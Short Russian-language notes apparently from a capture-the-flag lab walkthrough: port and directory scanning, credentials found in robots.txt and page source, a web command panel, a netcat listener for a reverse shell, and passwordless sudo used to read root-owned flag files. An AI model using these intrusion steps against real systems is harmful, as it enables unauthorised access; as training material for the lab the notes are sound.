
nmap -sC -sV ip

gobuster dir -u ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt - не помог

dirsearch -e php, html, sql, py -u 10.10.226.50 

есть  /logit.php
      /robots.txt - Wubbalubbadubdub
      /index.html - Username: R1ckRul3s

залогинились /logit.php

есть поле ввода команд
прошел ls -la 
найден файл Sup3rS3cretPickl3Ingred.txt
cat не сработал (оказывается есть команда less)

rlwrap nc -nlvp 9999

https://www.revshells.com

закинули шел
но можно было так http://10.10.53.48/Sup3rS3cretPickl3Ingred.txt

(взяли первый флаг)

снова ls
cd /home/rick/second ingredients 
cat second\ ingredients 

(взяли второй флаг)

sudo без пароля 

sudo cat /root/3rd.txt

(взяли третий флаг)

